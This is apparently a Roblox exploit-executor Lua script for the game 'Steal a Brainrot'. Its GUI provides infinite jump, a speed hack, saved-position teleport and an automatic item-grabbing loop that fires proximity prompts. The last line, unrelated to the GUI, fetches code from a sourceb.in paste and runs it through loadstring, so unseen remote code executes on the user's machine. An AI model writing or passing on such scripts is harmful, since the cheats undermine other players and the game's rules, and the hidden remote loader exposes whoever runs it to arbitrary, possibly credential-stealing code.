local UIS = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local Player = game.Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local PLACE_ID = 109983668079237
local ScreenGui = Instance.new("ScreenGui", PlayerGui)
ScreenGui.ResetOnSpawn = false

-- MAIN FRAME
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 270, 0, 360)
Frame.Position = UDim2.new(0.5, -135, 0.5, -180)
Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 65)
Frame.BorderSizePixel = 0
Frame.Active = true
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)

-- TITLE
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "Steal a Brainrot"
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.new(1,1,1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18

-- TAB BAR
local TabBar = Instance.new("Frame", Frame)
TabBar.Position = UDim2.new(0, 10, 0, 45)
TabBar.Size = UDim2.new(1, -20, 0, 35)
TabBar.BackgroundTransparency = 1

local function createTab(name, pos)
    local btn = Instance.new("TextButton", TabBar)
    btn.Size = UDim2.new(0.33, -5, 1, 0)
    btn.Position = pos
    btn.Text = name
    btn.BackgroundColor3 = Color3.fromRGB(55, 55, 85)
    btn.TextColor3 = Color3.new(1,1,1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    return btn
end

local MainTab = createTab("Main", UDim2.new(0,0,0,0))
local VisualTab = createTab("Visual", UDim2.new(0.34,0,0,0))
local MiscTab = createTab("Misc", UDim2.new(0.68,0,0,0))

-- PAGE CREATOR
local function createPage()
    local page = Instance.new("Frame", Frame)
    page.Position = UDim2.new(0, 10, 0, 85)
    page.Size = UDim2.new(1, -20, 1, -95)
    page.BackgroundTransparency = 1
    local layout = Instance.new("UIListLayout", page)
    layout.Padding = UDim.new(0, 6)
    return page
end

local MainPage = createPage()
local VisualPage = createPage()
local MiscPage = createPage()

-- BUTTON CREATOR
local function createButton(parent, text)
    local btn = Instance.new("TextButton", parent)
    btn.Size = UDim2.new(1, 0, 0, 38)
    btn.BackgroundColor3 = Color3.fromRGB(55, 55, 85)
    btn.TextColor3 = Color3.new(1,1,1)
    btn.Text = text
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    return btn
end

-- 🔼 INFINITE JUMP
local infJumpBtn = createButton(MainPage, "🔼 Infinite Jump")
local infJumpEnabled = false
local jumpConnection

infJumpBtn.MouseButton1Click:Connect(function()
    infJumpEnabled = not infJumpEnabled

    if infJumpEnabled then
        infJumpBtn.Text = "🔼 Infinite Jump: ON"
        infJumpBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 130)

        jumpConnection = UIS.JumpRequest:Connect(function()
            local char = Player.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    else
        infJumpBtn.Text = "🔼 Infinite Jump"
        infJumpBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 85)
        if jumpConnection then jumpConnection:Disconnect() end
    end
end)

-- 🧠 AUTO BRAINROT
local instantBtn = createButton(MainPage, "🧠 Auto Brainrot: OFF")
local instantEnabled = false
local autoConnection

local function isBrainrot(obj)
    return string.find(string.lower(obj.Name), "brainrot")
end

local function getClosestPrompt()
    local char = Player.Character
    if not char then return nil end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end

    local closest, dist = nil, math.huge

    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("ProximityPrompt") and v.Parent:IsA("BasePart") and isBrainrot(v.Parent) then
            local d = (v.Parent.Position - hrp.Position).Magnitude
            if d < dist and d <= (v.MaxActivationDistance or 10) then
                closest = v
                dist = d
            end
        end
    end
    return closest
end

instantBtn.MouseButton1Click:Connect(function()
    instantEnabled = not instantEnabled

    if instantEnabled then
        instantBtn.Text = "🧠 Auto Brainrot: ON"
        instantBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 130)

        autoConnection = RunService.Heartbeat:Connect(function()
            local prompt = getClosestPrompt()
            if prompt then
                pcall(function()
                    fireproximityprompt(prompt)
                end)
            end
        end)
    else
        instantBtn.Text = "🧠 Auto Brainrot: OFF"
        instantBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 85)
        if autoConnection then autoConnection:Disconnect() end
    end
end)

-- ⚡ SPEED 100 TOGGLE
local speedBtn = createButton(MainPage, "⚡ Speed: OFF")
local speedEnabled = false

local function applySpeed()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.WalkSpeed = speedEnabled and 100 or 16 end
end

speedBtn.MouseButton1Click:Connect(function()
    speedEnabled = not speedEnabled
    applySpeed()
    speedBtn.Text = speedEnabled and "⚡ Speed: ON" or "⚡ Speed: OFF"
end)

Player.CharacterAdded:Connect(function()
    task.wait(0.5)
    applySpeed()
end)

-- 💾 SAVE / TP FIX
local saveBtn = createButton(MainPage, "💾 Save Position")
local tpBtn = createButton(MainPage, "📍 Teleport to Saved")

local savedPosition

saveBtn.MouseButton1Click:Connect(function()
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if hrp then savedPosition = CFrame.new(hrp.Position) end
end)

tpBtn.MouseButton1Click:Connect(function()
    if not savedPosition then return end
    local char = Player.Character or Player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")

    local ok = pcall(function()
        char:PivotTo(savedPosition)
    end)

    if not ok then
        hrp.CFrame = savedPosition
    end
end)

-- VISUAL / MISC
createButton(VisualPage, "👁️ ESP")
createButton(VisualPage, "🌈 Fullbright")
createButton(MiscPage, "🚪 Server Hop")
createButton(MiscPage, "🔄 Rejoin Server")

-- TAB SYSTEM
local ACTIVE = Color3.fromRGB(80,80,130)
local INACTIVE = Color3.fromRGB(55,55,85)

local function setTab(btn,page)
    MainPage.Visible=false VisualPage.Visible=false MiscPage.Visible=false
    MainTab.BackgroundColor3=INACTIVE VisualTab.BackgroundColor3=INACTIVE MiscTab.BackgroundColor3=INACTIVE
    btn.BackgroundColor3=ACTIVE page.Visible=true
end

setTab(MainTab,MainPage)
MainTab.MouseButton1Click:Connect(function() setTab(MainTab,MainPage) end)
VisualTab.MouseButton1Click:Connect(function() setTab(VisualTab,VisualPage) end)
MiscTab.MouseButton1Click:Connect(function() setTab(MiscTab,MiscPage) end)

-- DRAG
local dragging, dragStart, startPos

Title.InputBegan:Connect(function(input)
    if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
        dragging=true
        dragStart=input.Position
        startPos=Frame.Position
        input.Changed:Connect(function()
            if input.UserInputState==Enum.UserInputState.End then dragging=false end
        end)
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging then
        local delta=input.Position-dragStart
        Frame.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+delta.X,startPos.Y.Scale,startPos.Y.Offset+delta.Y)
    end
end)
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/hWHSykNb1T/0"))()
